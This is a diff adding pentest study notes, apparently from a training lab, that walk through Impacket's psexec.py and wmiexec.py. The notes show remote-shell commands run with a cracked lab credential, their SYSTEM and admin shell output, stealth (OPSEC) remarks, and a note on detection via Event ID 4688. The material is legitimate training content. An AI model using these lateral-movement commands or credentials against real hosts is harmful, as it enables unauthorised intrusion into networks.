@@ -6815,6 +6815,232 @@ Regardless of the domain name or SID, these built-in accounts and groups ALWAYS 
 <details>
 <summary><h3>Impacket Toolkit</h3></summary>
 
+**Impacket** is a versatile Python toolkit that provides diverse ways to enumerate, interact, and exploit Windows protocols. It's actively maintained and a mandatory staple in any pentester's arsenal. In this phase, we leverage local administrator credentials (e.g., `wley`:`transporter@4` cracked via Responder) to gain interactive execution on target hosts.
+
+<details>
+<summary><h4>psexec.py (The Loud SYSTEM Shell)</h4></summary>
+
+`psexec.py` is a Python clone of the Sysinternals executable but operates slightly differently. It strictly requires Local Administrator privileges.
+
+**How it works under the hood:**
+1. Uploads a randomly-named executable to the `ADMIN$` share on the target host.
+2. Registers the service via RPC and the Windows Service Control Manager (SCM).
+3. Communicates over a named pipe, dropping you into a fully interactive remote shell as `NT AUTHORITY\SYSTEM`.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+# [*] Requesting shares on 172.16.5.130.....
+# [*] Found writable share ADMIN$
+# [*] Uploading file LXxnyrIo.exe
+# [*] Opening SVCManager on 172.16.5.130.....
+# [*] Creating service DVPR on 172.16.5.130.....
+# [*] Starting service DVPR.....
+# [!] Press help for extra shell commands
+# Microsoft Windows [Version 10.0.17763.2237]
+# (c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+# nt authority\system
+
+C:\Windows\system32>systeminfo
+
+# Host Name:                 ACADEMY-EA-FILE
+# OS Name:                   Microsoft Windows Server 2019 Standard
+# OS Version:                10.0.17763 N/A Build 17763
+# OS Manufacturer:           Microsoft Corporation
+# OS Configuration:          Member Server
+# OS Build Type:             Multiprocessor Free
+# Registered Owner:          Windows User
+# Registered Organization:   
+# Product ID:                00429-00521-62775-AA294
+# Original Install Date:     10/27/2021, 8:09:13 AM
+# System Boot Time:          3/30/2026, 7:45:59 PM
+# System Manufacturer:       VMware, Inc.
+# System Model:              VMware7,1
+# System Type:               x64-based PC
+# Processor(s):              2 Processor(s) Installed.
+#                            [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+#                            [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+# BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
+# Windows Directory:         C:\Windows
+# System Directory:          C:\Windows\system32
+# Boot Device:               \Device\HarddiskVolume3
+# System Locale:             en-us;English (United States)
+# Input Locale:              en-us;English (United States)
+# Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+# Total Physical Memory:     6,143 MB
+# Available Physical Memory: 1,359 MB
+# Virtual Memory: Max Size:  12,286 MB
+# Virtual Memory: Available: 5,260 MB
+# Virtual Memory: In Use:    7,026 MB
+# Page File Location(s):     C:\pagefile.sys
+# Domain:                    INLANEFREIGHT.LOCAL
+# Logon Server:              N/A
+# Hotfix(s):                 5 Hotfix(s) Installed.
+#                            [01]: KB5006368
+#                            [02]: KB4535680
+#                            [03]: KB4589208
+#                            [04]: KB5006672
+#                            [05]: KB5005701
+# Network Card(s):           1 NIC(s) Installed.
+#                            [01]: vmxnet3 Ethernet Adapter
+#                                  Connection Name: Ethernet0
+#                                  DHCP Enabled:    No
+#                                  IP address(es)
+#                                  [01]: 172.16.5.130
+#                                  [02]: fe80::c42c:9c02:ec7e:d13f
+# Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+
+</td>
+</tr>
+</table>
+
+*Landing as `SYSTEM` in the `system32` directory allows for ultimate control: further enumeration, dumping hashes, persistence, or lateral movement.*
+
+</details>
+
+<details>
+<summary><h4>pwmiexec.py (The Stealthy Admin Shell)</h4></summary>
+
+`wmiexec.py` provides a semi-interactive shell executing commands directly through **Windows Management Instrumentation (WMI)**. 
+
+**OPSEC Advantages & Mechanics:**
+* **Fileless(ish):** It does *not* drop executables on the target host's disk (generating fewer logs).
+* **Context:** It runs under the context of the local admin user we authenticated as (not `SYSTEM`), blending in slightly better with normal administrative traffic.
+* **Mechanism:** It isn't fully interactive. Every time you press enter, it leverages WMI to spawn a *new* `cmd.exe` process to execute that specific command, captures the output, and returns it to your terminal.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux Pentest VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`htb-student@ea-attack01:~$`**
+
+</td>
+<td>
+
+```bash
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+# [*] SMBv3.0 dialect used
+# [!] Launching semi-interactive shell - Careful what you execute
+# [!] Press help for extra shell commands
+C:\>whoami
+# inlanefreight\wley
+
+C:\>ipconfig
+
+# Windows IP Configuration
+
+
+# Ethernet adapter Ethernet0:
+
+#    Connection-specific DNS Suffix  . : 
+#    Link-local IPv6 Address . . . . . : fe80::c42c:9c02:ec7e:d13f%9
+#    IPv4 Address. . . . . . . . . . . : 172.16.5.130
+#    Subnet Mask . . . . . . . . . . . : 255.255.254.0
+#    Default Gateway . . . . . . . . . : 172.16.5.1
+
+C:\>systeminfo
+
+# Host Name:                 ACADEMY-EA-FILE
+# OS Name:                   Microsoft Windows Server 2019 Standard
+# OS Version:                10.0.17763 N/A Build 17763
+# OS Manufacturer:           Microsoft Corporation
+# OS Configuration:          Member Server
+# OS Build Type:             Multiprocessor Free
+# Registered Owner:          Windows User
+# Registered Organization:   
+# Product ID:                00429-00521-62775-AA294
+# Original Install Date:     10/27/2021, 8:09:13 AM
+# System Boot Time:          3/30/2026, 7:45:59 PM
+# System Manufacturer:       VMware, Inc.
+# System Model:              VMware7,1
+# System Type:               x64-based PC
+# Processor(s):              2 Processor(s) Installed.
+#                            [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+#                            [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+# BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
+# Windows Directory:         C:\Windows
+# System Directory:          C:\Windows\system32
+# Boot Device:               \Device\HarddiskVolume3
+# System Locale:             en-us;English (United States)
+# Input Locale:              en-us;English (United States)
+# Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+# Total Physical Memory:     6,143 MB
+# Available Physical Memory: 1,364 MB
+# Virtual Memory: Max Size:  12,286 MB
+# Virtual Memory: Available: 5,309 MB
+# Virtual Memory: In Use:    6,977 MB
+# Page File Location(s):     C:\pagefile.sys
+# Domain:                    INLANEFREIGHT.LOCAL
+# Logon Server:              N/A
+# Hotfix(s):                 5 Hotfix(s) Installed.
+#                            [01]: KB5006368
+#                            [02]: KB4535680
+#                            [03]: KB4589208
+#                            [04]: KB5006672
+#                            [05]: KB5005701
+# Network Card(s):           1 NIC(s) Installed.
+#                            [01]: vmxnet3 Ethernet Adapter
+#                                  Connection Name: Ethernet0
+#                                  DHCP Enabled:    No
+#                                  IP address(es)
+#                                  [01]: 172.16.5.130
+#                                  [02]: fe80::c42c:9c02:ec7e:d13f
+# Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+C:\>
+
+
+```
+
+</td>
+</tr>
+</table>
+
+> **⚠️ Blue Team / OPSEC Warning:** While stealthier than `psexec`, it is not invisible to modern Anti-Virus or EDR systems. Vigilant defenders hunting for intrusions will monitor **Event ID 4688 (A new process has been created)**. Seeing a new process created to spawn `cmd.exe` repeatedly over WMI can be a massive tip-off during an investigation.
+
+</details>
+
 </details>
 
 <details>
